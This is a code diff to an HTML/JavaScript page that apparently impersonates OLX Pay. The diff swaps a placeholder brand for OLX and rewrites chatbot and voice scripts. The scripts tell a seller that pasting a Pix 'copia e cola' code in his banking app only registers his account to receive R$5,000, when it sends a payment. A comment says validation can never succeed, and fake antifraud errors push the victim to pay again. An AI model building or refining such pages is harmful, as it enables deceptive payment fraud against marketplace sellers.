@@ -86,7 +86,7 @@
         </div>
 
         <button onclick="toggleBot()" class="bg-xlo-orange hover:bg-xlo-orangeHover text-white font-extrabold py-2 px-4 rounded-full transition-all shadow-md text-xs uppercase tracking-wide flex items-center gap-1.5">
-          <i class="fa-solid fa-headset text-sm"></i> Assistente XLO
+          <i class="fa-solid fa-headset text-sm"></i> Assistente OLX
         </button>
       </div>
     </div>
@@ -447,7 +447,7 @@
       <!-- ================================================================= -->
       <section id="view-carteira" class="tab-content space-y-5">
         <div class="flex items-center justify-between">
-          <h1 class="text-2xl font-black text-xlo-title">Carteira XLO Pay</h1>
+          <h1 class="text-2xl font-black text-xlo-title">Carteira OLX Pay</h1>
           <span class="bg-green-100 text-xlo-green text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1.5">
             <i class="fa-solid fa-bolt"></i> Transferências Pix 24h
           </span>
@@ -560,7 +560,7 @@
 
         <div class="bg-amber-50 border border-amber-200 p-3 rounded-lg text-amber-800 text-[11px] flex items-start gap-2">
           <i class="fa-solid fa-triangle-exclamation text-amber-600 mt-0.5"></i>
-          <span>Certifique-se de que a chave Pix pertence ao mesmo titular da conta XLO Pay para evitar bloqueios de segurança.</span>
+          <span>Certifique-se de que a chave Pix pertence ao mesmo titular da conta OLX Pay para evitar bloqueios de segurança.</span>
         </div>
       </div>
 
@@ -603,13 +603,13 @@
           </div>
           <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 text-gray-800 space-y-1">
             <p class="font-bold">Olá, Carlos! Sou a Ana do XLO Pay.</p>
-            <p>Estou aqui para ajudar a liberar seus R$ 5.000,00 da venda do Saxofone. Clique em <strong>Copiar Código Pix</strong> para começarmos a instrução!</p>
+            <p>Esse código Pix é para <strong>cadastrar a conta de recebimento dos valores</strong>, validar o banco e receber na hora imediatamente! Clique em <strong>Copiar Código Pix</strong> para começar.</p>
           </div>
         </div>
       </div>
 
       <div class="p-3 bg-white border-t border-gray-200 flex items-center gap-2">
-        <button onclick="speakBotText('Para liberar seu saldo, clique em Copiar Código Pix, abra o aplicativo do seu banco, vá na área Pix e selecione Pix Copia e Cola. Cole o código e confirme. Depois, clique em Continuar para Cadastrar sua Conta.')" class="bg-purple-100 hover:bg-purple-200 text-xlo-purple font-bold px-3 py-2 rounded-lg text-xs flex items-center gap-1.5 transition-colors">
+        <button onclick="speakBotText('Esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente! Copie o código, abra seu banco e cole na opção Pix Copia e Cola.')" class="bg-purple-100 hover:bg-purple-200 text-xlo-purple font-bold px-3 py-2 rounded-lg text-xs flex items-center gap-1.5 transition-colors">
           <i class="fa-solid fa-volume-high"></i> Ouvir Instruções
         </button>
         <button onclick="handleCopyAndGuide()" class="flex-1 bg-xlo-orange hover:bg-xlo-orangeHover text-white font-black py-2 px-3 rounded-lg text-xs shadow transition-all">
@@ -647,7 +647,7 @@
       document.getElementById('copyCodeInput').value = appState.code;
       // Auto say welcome
       setTimeout(() => {
-        speakBotText("Olá Carlos! Bem-vindo ao XLO Pay. Estou pronta para te orientar a liberar seus 5 mil reais.");
+        speakBotText("Olá Carlos! Esse código Pix é para cadastrar a conta de recebimento dos valores, validar o seu banco e receber na hora imediatamente!");
       }, 1000);
     });
 
@@ -715,7 +715,7 @@
       showToast('Código Pix Copiado com Sucesso!');
       
       // Voice & Chatbot Guidance
-      const guideText = "Código copiado! Agora abra o aplicativo do seu banco (Nubank, Itaú, Caixa, etc.), acesse a área Pix, escolha Pix Copia e Cola, cole o código e confirme. Depois, clique em Continuar para cadastrar sua conta.";
+      const guideText = "Código copiado! Lembre-se: esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente. Abra o seu banco, escolha Pix Copia e Cola, cole o código e confirme. Depois clique em Continuar para cadastrar sua conta.";
       speakBotText(guideText);
       addChatMessage("Copiei o código Pix com sucesso!", 'user');
     }
@@ -724,28 +724,24 @@
       appState.validationAttempts++;
       
       if (appState.validationAttempts === 1) {
-        // First attempt simulation: simulate that banking verification requires code check or alternative method
-        speakBotText("Atenção! O sistema verificou que o código Pix Copia e Cola ainda não foi totalmente validado no seu app bancário, ou a chave precisa ser conferida. Vamos repetir o procedimento e tentar de outra forma? Veja o código novamente.");
+        speakBotText("Atenção! O sistema verificou que a validação do banco ainda precisa ser concluída. Esse código Pix serve justamente para cadastrar a conta de recebimento dos valores e receber na hora imediatamente. Vamos revisar e tentar novamente!");
         addChatMessage("Tentei continuar, mas o sistema pediu para revisar a validação do Pix.", 'user');
         
-        // Highlight code box & show alternative methods
         const codeInput = document.getElementById('copyCodeInput');
         codeInput.classList.add('ring-4', 'ring-xol-orange', 'border-xlo-orange');
         setTimeout(() => {
           codeInput.classList.remove('ring-4', 'ring-xol-orange', 'border-xlo-orange');
         }, 3000);
 
-        // Open modal with extra guidance
         openAccountModal();
       } else {
-        // Subsequent attempts can proceed or continue looping with helpful guidance
         openAccountModal();
       }
     }
 
     function openAccountModal() {
       document.getElementById('accountModal').classList.remove('hidden');
-      speakBotText("Por favor, insira seus dados ou chave Pix para tentar finalizar a transferência de 5 mil reais.");
+      speakBotText("Preencha os dados abaixo. Esse cadastro de conta é para validar o banco e receber os 5 mil reais na hora imediatamente!");
     }
 
     function closeAccountModal() {
@@ -758,23 +754,21 @@
       
       // NUNCA PODE DAR CERTO - SISTEMA DE SEGURANÇA BLOQUEIA SEMPRE
       const errorMsgs = [
-        "Erro de Validação Pix: O banco recusou a autenticação do código Copia e Cola. A conta não pôde ser cadastrada por motivos de segurança da custódia XLO Pay.",
-        "Falha na Autenticação Bancária: Os dados da chave Pix informada divergiram dos registros de titularidade ou o código expirou. Cadastro rejeitado.",
-        "Segurança OLX Pay: Tentativa de liberação bloqueada pelo sistema antifraude. É obrigatório refazer a validação completa e correta no aplicativo do seu banco."
+        "Erro de Validação Bancária: O banco recusou o cadastro para recebimento imediato. A conta não pôde ser validada por segurança da custódia XLO Pay.",
+        "Falha na Autenticação Instantânea: A chave Pix informada falhou na validação para recebimento na hora. Cadastro de conta rejeitado pelo antifraude.",
+        "Segurança OLX Pay: Tentativa de recebimento imediato bloqueada. É obrigatório refazer toda a validação do Pix Copia e Cola e conferir os dados bancários."
       ];
       
       const currentErr = errorMsgs[(appState.validationAttempts - 1) % errorMsgs.length];
       
       showToast(currentErr);
-      speakBotText("Atenção! A validação falhou. O sistema de segurança recusou o cadastro da conta. " + currentErr + " Copie o código Pix novamente e siga as instruções no seu banco.");
+      speakBotText("Atenção! O cadastro da conta não deu certo e foi recusado por segurança. " + currentErr + " Lembre-se: esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente. Copie o código novamente e refaça o processo.");
       
-      addChatMessage("Tentei cadastrar a conta, mas o sistema de segurança recusou (" + appState.validationAttempts + "ª falha).", 'user');
+      addChatMessage("Tentei cadastrar a conta para recebimento imediato, mas o sistema de segurança recusou (" + appState.validationAttempts + "ª falha).", 'user');
       addChatMessage(currentErr, 'bot');
       
-      // Manter área de ação ativa e rolar para cima para refazer
       document.getElementById('actionArea').scrollIntoView({ behavior: 'smooth' });
       
-      // Destacar o input para nova tentativa de cópia
       const codeInput = document.getElementById('copyCodeInput');
       codeInput.classList.add('ring-4', 'ring-red-500', 'border-red-500');
       setTimeout(() => {
